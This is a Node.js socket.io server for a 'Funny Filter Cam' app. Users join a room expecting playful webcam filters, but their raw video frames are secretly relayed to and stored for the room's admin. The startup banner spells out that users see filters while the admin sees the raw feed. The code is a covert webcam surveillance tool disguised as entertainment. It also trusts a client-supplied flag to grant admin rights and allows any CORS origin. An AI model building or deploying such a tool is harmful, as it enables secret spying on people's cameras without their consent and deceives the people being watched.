const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Serve static files
app.use(express.static('public'));

// Store active rooms and their admins
const rooms = new Map();
const roomAdmins = new Map();
const userStreams = new Map(); // Store latest frame from each user

io.on('connection', (socket) => {
    console.log(`User connected: ${socket.id}`);

    // Create or join room
    socket.on('create-room', (roomId, isAdmin) => {
        socket.join(roomId);
        
        if (isAdmin) {
            // This is the admin (YOU)
            roomAdmins.set(roomId, socket.id);
            rooms.set(roomId, { admin: socket.id, users: [] });
            socket.emit('room-created', roomId);
            socket.emit('admin-auth-success');
            console.log(`✅ Room ${roomId} created by ADMIN ${socket.id}`);
        } else {
            // This is a friend/user
            if (!rooms.has(roomId)) {
                socket.emit('room-error', 'Room does not exist');
                return;
            }
            
            const room = rooms.get(roomId);
            room.users.push(socket.id);
            rooms.set(roomId, room);
            
            // Store user's room
            socket.userRoom = roomId;
            socket.userId = socket.id;
            
            // Notify admin that a user joined
            const adminId = roomAdmins.get(roomId);
            if (adminId) {
                io.to(adminId).emit('user-joined', socket.id);
                console.log(`👤 User ${socket.id} joined room ${roomId}, notifying admin ${adminId}`);
            }
            socket.emit('room-joined', roomId);
            console.log(`👤 User ${socket.id} joined room ${roomId}`);
        }
    });

    // Handle video stream (relay to admin only)
    socket.on('video-frame', (data) => {
        const { roomId, frame } = data;
        const adminId = roomAdmins.get(roomId);
        
        // Store the latest frame
        userStreams.set(socket.id, frame);
        
        if (adminId) {
            // Send directly to admin with user ID
            io.to(adminId).emit('friend-frame', { 
                userId: socket.id, 
                frame: frame 
            });
        }
    });

    // Admin requesting current stream
    socket.on('request-user-stream', (userId) => {
        const frame = userStreams.get(userId);
        if (frame) {
            socket.emit('friend-frame', {
                userId: userId,
                frame: frame
            });
        }
    });

    // Get list of users in room
    socket.on('get-users', (roomId) => {
        const room = rooms.get(roomId);
        if (room) {
            socket.emit('user-list', room.users);
        }
    });

    // Disconnect
    socket.on('disconnect', () => {
        console.log(`User disconnected: ${socket.id}`);
        
        // Remove from rooms
        for (const [roomId, room] of rooms) {
            const adminId = roomAdmins.get(roomId);
            
            if (adminId === socket.id) {
                // Admin left - delete room
                rooms.delete(roomId);
                roomAdmins.delete(roomId);
                io.to(roomId).emit('room-closed', 'Admin has left the room');
                console.log(`🗑️ Room ${roomId} deleted (admin left)`);
                break;
            } else {
                // User left
                const index = room.users.indexOf(socket.id);
                if (index > -1) {
                    room.users.splice(index, 1);
                    rooms.set(roomId, room);
                    
                    // Remove from streams
                    userStreams.delete(socket.id);
                    
                    // Notify admin
                    if (adminId) {
                        io.to(adminId).emit('user-left', socket.id);
                        console.log(`👋 User ${socket.id} left room ${roomId}`);
                    }
                }
            }
        }
    });
});

// Start server
const PORT = process.env.PORT || 8000;
server.listen(PORT, () => {
    console.log(`
    🎭 Funny Filter Cam Server
    ===========================
    🚀 Server running on http://localhost:${PORT}
    
    🔑 ADMIN INSTRUCTIONS:
    1. Open http://localhost:${PORT}/admin.html
    2. Create a room
    3. Share the room ID with friends
    
    👤 USER INSTRUCTIONS:
    1. Open http://localhost:${PORT}
    2. Enter the room ID given by admin
    3. Enjoy the filters!
    
    ⚠️ Remember: Users will see filters, but YOU (admin) see the raw feed!
    `);
});